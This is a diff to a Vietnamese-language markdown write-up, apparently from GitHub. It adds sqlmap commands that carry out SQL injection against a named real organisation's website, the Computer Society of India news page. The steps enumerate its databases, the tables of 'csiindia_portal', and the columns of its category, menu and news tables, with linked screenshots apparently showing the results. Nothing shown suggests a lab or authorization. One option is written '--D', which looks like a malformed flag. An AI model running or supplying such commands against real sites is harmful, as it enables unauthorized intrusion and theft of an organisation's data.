@@ -80,19 +80,21 @@ Kiểm tra trên web "Computer Society of India" `https://csi-india.org/news/ind
 
 **1. Trích xuất database:**
 
+`sqlmap -u https://csi-india.org/news/index.php?id=18 --dbs`
+
 ![image](https://github.com/user-attachments/assets/9eb20627-fe43-4f2d-a951-70ad997a8b40)
 
 **2. Lấy các bảng trong database**
+
+`sqlmap -u https://csi-india.org/news/index.php?id=18 --D csiindia_portal --tables`
 
 ![image](https://github.com/user-attachments/assets/5175361d-dbfc-4e58-816b-a83455ffbf2f)
 
 **3. Lấy các cột trong bảng**
 
+`sqlmap -u https://csi-india.org/news/index.php?id=18 --D csiindia_portal -T category,menu,news --columns`
+
 ![image](https://github.com/user-attachments/assets/e6f0927a-96ea-4981-8369-1ce2c3304d79)
-
-![image](https://github.com/user-attachments/assets/0f51fac4-636d-4fd7-9484-61a5228846b6)
-
-![image](https://github.com/user-attachments/assets/8e4d4498-7349-4421-8d82-4454e266ccb6)
 
 
 
